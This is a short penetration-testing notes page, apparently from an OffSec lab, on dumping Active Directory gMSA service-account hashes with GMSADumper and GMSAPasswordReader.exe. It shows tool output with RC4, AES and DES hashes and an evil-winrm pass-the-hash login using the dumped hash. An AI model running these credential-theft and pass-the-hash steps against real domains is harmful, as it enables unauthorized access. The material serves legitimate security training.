# Attacking Service Accounts

## Introduction

For more on service accounts and enumeration go here:

{% embed url="https://www.rotta.rocks/active-directory/enumerating-active-directory/enumerating-objects#confirm-gmsa-is-enabled" %}

{% embed url="https://www.rotta.rocks/active-directory/enumerating-active-directory/enumerating-service-accounts" %}

## Dumping hashes - Group Managed Service Accounts (GMSA)

It's not uncommon to see service accounts that utilize GMSA to handle credentials.&#x20;

### GMSADumper.py

We can use GMSADumper from our kali box to dump hashes. Depending on the user we're running from we'll receive a full NTLMv2 hash or a NT Hash.&#x20;

From there we can go along to either crack the NTLMv2 hash or try to perform a Pass-The-Ticket (PTT) attack.

{% embed url="https://github.com/micahvandeusen/gMSADumper" %}

### **GMSAPasswordReader.exe**&#x20;

If we have access to a service account with READ privilege for GMSA we can use [GMSAPasswordReader.exe](https://github.com/expl0itabl3/Toolies) to view the password of the GMSA managed service account

```powershell
.\GMSAPasswordReader.exe --accountname 'svc_apache'

Calculating hashes for Old Value
[*] Input username             : svc_apache$
[*] Input domain               : HEIST.OFFSEC
[*] Salt                       : HEIST.OFFSECsvc_apache$
[*]       rc4_hmac             : 526C435B8E4CF11F447D6EF7152665BB
[*]       aes128_cts_hmac_sha1 : 19565C12FDE19AD1033BA3BBD56DD230
[*]       aes256_cts_hmac_sha1 : 43F6DECE6269A588687ACFF41F633A0F7AA9C3FBC7FEAB8BE6981854C19FE817
[*]       des_cbc_md5          : 4AEA91DCEF918F29

Calculating hashes for Current Value
[*] Input username             : svc_apache$
[*] Input domain               : HEIST.OFFSEC
[*] Salt                       : HEIST.OFFSECsvc_apache$
[*]       rc4_hmac             : 83AC7FECFBF44780E3AAF5D04DD368A5
[*]       aes128_cts_hmac_sha1 : 08E643C43F775FAC782EDBB04DD40541
[*]       aes256_cts_hmac_sha1 : 588C2BB865E771ECAADCB48ECCF4BCBCD421BF329B0133A213C83086F1A2E3D7
[*]       des_cbc_md5          : 9E340723700454E9

```

<mark style="color:red;">NOTE:</mark> rc4\_hmac is the same as the ntlm hash.



### Login to svc\_apache with credentials

DONT FORGET THE $ IN THE USERNAME! ANYTIME YOU SEE THIS YOU MUST ADD IT!

```shell-session
evil-winrm -i 192.168.191.165 -u svc_apache$ -H 83AC7FECFBF44780E3AAF5D04DD368A5 
```
